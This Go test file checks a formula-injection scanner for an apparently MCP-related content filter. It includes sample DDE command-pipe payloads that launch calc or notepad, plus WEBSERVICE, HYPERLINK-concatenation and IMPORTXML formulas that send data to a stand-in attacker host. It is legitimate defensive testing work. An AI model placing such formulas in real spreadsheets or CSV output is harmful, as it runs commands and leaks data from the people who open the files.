package mcp

import (
	"strings"
	"testing"
)

func TestScanFormulaInjection_CmdPipeDDE(t *testing.T) {
	items := []ContentItem{{Type: "text", Text: "Q3 Sales\nName,Amount\n=cmd|'/c calc'!A1,100\n"}}
	res := ScanFormulaInjection(items)
	if !res.Blocked {
		t.Fatal("cmd-pipe DDE payload must block")
	}
}

func TestScanFormulaInjection_WEBSERVICE(t *testing.T) {
	items := []ContentItem{{Type: "text", Text: "Header\n=WEBSERVICE(\"https://evil.example/log\")\n"}}
	res := ScanFormulaInjection(items)
	if !res.Blocked {
		t.Fatal("WEBSERVICE payload must block")
	}
}

func TestScanFormulaInjection_HyperlinkConcat(t *testing.T) {
	items := []ContentItem{{Type: "text", Text: "report.csv\n=HYPERLINK(\"https://evil.example/?d=\"&A1,\"Click\")\n"}}
	res := ScanFormulaInjection(items)
	if !res.Blocked {
		t.Fatal("HYPERLINK with concat exfil must block")
	}
}

func TestScanFormulaInjection_ImportXML(t *testing.T) {
	items := []ContentItem{{Type: "text", Text: "Sheet\n=IMPORTXML(\"https://evil.example/\",\"//body\")\n"}}
	res := ScanFormulaInjection(items)
	if !res.Blocked {
		t.Fatal("IMPORTXML payload must block")
	}
}

func TestScanFormulaInjection_DDEExplicit(t *testing.T) {
	items := []ContentItem{{Type: "text", Text: "=DDE(\"cmd\",\"/c calc\",\"A1\")\n"}}
	res := ScanFormulaInjection(items)
	if !res.Blocked {
		t.Fatal("explicit DDE() payload must block")
	}
}

func TestScanFormulaInjection_AtPrefix(t *testing.T) {
	items := []ContentItem{{Type: "text", Text: "row1\n@cmd|notepad!A0\n"}}
	res := ScanFormulaInjection(items)
	if !res.Blocked {
		t.Fatal("@-prefixed cmd-pipe payload must block")
	}
}

func TestScanFormulaInjection_PlusPrefixCSVSeparator(t *testing.T) {
	// CSV-separator-leading +cmd: payloads must trigger (the cell is in the
	// 2nd or later column).
	items := []ContentItem{{Type: "text", Text: "col1,+cmd|'/c calc'!A1,col3\n"}}
	res := ScanFormulaInjection(items)
	if !res.Blocked {
		t.Fatalf("CSV-separator-leading +cmd-pipe payload must block, got %+v", res.Findings)
	}
}

// --- Realistic developer-workflow TNs ---------------------------------------

func TestScanFormulaInjection_BenignCSV(t *testing.T) {
	items := []ContentItem{{Type: "text", Text: "name,age,city\nalice,30,oakland\nbob,42,denver\n"}}
	res := ScanFormulaInjection(items)
	if res.Blocked {
		t.Fatalf("benign CSV must not block: %+v", res.Findings)
	}
}

func TestScanFormulaInjection_MathExpression(t *testing.T) {
	items := []ContentItem{{Type: "text", Text: "If a = b then we have equality.\nLet x = 2 * y.\n"}}
	res := ScanFormulaInjection(items)
	if res.Blocked {
		t.Fatalf("prose with mid-line equals must not block: %+v", res.Findings)
	}
}

func TestScanFormulaInjection_CodeSnippet(t *testing.T) {
	items := []ContentItem{{Type: "text", Text: "var x = 42;\nconst y = -3;\nfn = lambda: x + y\n"}}
	res := ScanFormulaInjection(items)
	if res.Blocked {
		t.Fatalf("code snippet must not block: %+v", res.Findings)
	}
}

func TestScanFormulaInjection_LegitimateHyperlinkNoConcat(t *testing.T) {
	// Plain HYPERLINK is a legitimate Excel formula; only the concat-with-cell
	// exfil shape is flagged.
	items := []ContentItem{{Type: "text", Text: "label,link\nfoo,=HYPERLINK(\"https://example.com\",\"foo\")\n"}}
	res := ScanFormulaInjection(items)
	if res.Blocked {
		t.Fatalf("plain HYPERLINK must not block: %+v", res.Findings)
	}
}

func TestScanFormulaInjection_MarkdownTableDashes(t *testing.T) {
	// Markdown table rows often begin with `-` or `|`; ensure we don't FP on
	// the dash-prefix case where what follows is markdown content, not a
	// formula function.
	body := strings.Join([]string{
		"| Col A | Col B |",
		"|-------|-------|",
		"|  1    |   2   |",
		"- bullet",
		"- bullet 2",
	}, "\n")
	res := ScanFormulaInjection([]ContentItem{{Type: "text", Text: body}})
	if res.Blocked {
		t.Fatalf("markdown table/list must not block: %+v", res.Findings)
	}
}

func TestScanFormulaInjection_NonTextIgnored(t *testing.T) {
	items := []ContentItem{{Type: "image", Data: "PHNjcmlwdD4="}}
	res := ScanFormulaInjection(items)
	if res.Blocked {
		t.Fatal("non-text content must be ignored by formula scanner")
	}
}
